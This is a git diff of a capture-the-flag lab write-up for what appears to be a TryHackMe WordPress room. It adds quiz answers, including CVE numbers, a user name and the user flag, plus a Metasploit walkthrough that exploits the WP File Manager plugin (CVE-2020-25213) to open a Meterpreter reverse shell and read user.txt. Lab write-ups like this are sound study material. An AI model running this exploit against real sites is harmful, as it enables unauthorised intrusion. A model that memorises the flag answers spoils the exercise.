@@ -203,27 +203,23 @@ PORT     STATE SERVICE
 <p>5.1. <em>What CMS is running on the machine?</em><br>
 <code>wordpress</code></p>
 
-
 <p>5.2. <em>What protocols are used for these ports?</em><br>
 <code>http, mysql</code></p>
 
 <p>5.3. <em>What is the CVE number for directory traversal vulnerability?</em><br>
 <code>CVE-2020-11738</code></p>
 
-
 <p>5.4. <em>What is the CVE number for remote code execution vulnerability?</em><br>
 <code>CVE-2020-25213</code></p>
 
 <p>5.5. <em>There is a metasploit module for the exploit. You can use it to get the reverse shell. If you are feeling lucky you can follow any POC( Proof of Concept).</em><br>
-<code>http, mysql</code></p>
-[CVE-20XX-XXXXX](https://github.com/electronforce/py2to3/blob/main/CVE-2020-25213.py)
+<code>No answer needed</code></p>
 
 <p>5.6. <em>What is the name of user that was running CMS?</em><br>
-<code>http, mysql</code></p>
+<code>cth</code></p>
 
 <p>5.6. <em>What is the user flag?</em><br>
-<code>http, mysql</code></p>
-
+<code>THM{227906201d17d9c45aa93d0122ea1af7}</code></p>
 
 
 ```bash
@@ -282,6 +278,59 @@ PORT     STATE SERVICE  REASON
 ```bash
 :~/Badbytes#  msfconsole -q
 ```
+
+```bash
+msf6> search wordpress file manager
+
+msf6 exploit(multi/http/wp_file_manager_rce) > set RPORT 8000
+msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1
+msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST AttackIP
+msf6 exploit(multi/http/wp_file_manager_rce) > check
+[*] 127.0.0.1:8000 - The target appears to be vulnerable.
+
+...
+
+msf6 exploit(multi/http/wp_file_manager_rce) > run
+[*] Started reverse TCP handler on 10.81.117.66:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] 127.0.0.1:8000 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/D9I7BS.php
+[*] Sending stage (40004 bytes) to 10.81.188.64
+[+] Deleted D9I7BS.php
+[*] Meterpreter session 1 opened (10.81.117.66:4444 -> 10.81.188.64:33012) at 2026-02-07 20:31:15 +0000
+
+meterpreter > shell
+Process 3250 created.
+Channel 0 created.
+whoami
+cth
+pwd
+/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
+cd /home
+ls
+cth
+errorcauser
+ubuntu
+cd cth
+ls
+user.txt
+cat user.txt
+THM{227906201d17d9c45aa93d0122ea1af7}
+
+
+
+```
+
+
+<img width="779" height="194" alt="image" src="https://github.com/user-attachments/assets/92c7812f-0194-4125-8b12-6d6db1018249" />
+
+
+<br>
+<br>
+
+
+<br>
+<br>
 
 <h2>Task 6 . Privilege Escalation</h2>
 
